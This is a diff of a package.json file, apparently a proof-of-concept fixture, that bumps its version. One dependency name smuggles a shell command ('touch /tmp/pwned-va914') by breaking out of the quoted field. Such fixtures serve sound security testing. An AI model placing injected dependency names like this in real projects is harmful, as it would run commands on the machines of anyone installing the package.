@@ -1,6 +1,6 @@
 {
   "name": "poc-va914",
-  "version": "1.0.0",
+  "version": "1.0.1",
   "dependencies": {
     "foo\" && touch /tmp/pwned-va914 && \"": "1.0.0"
   }
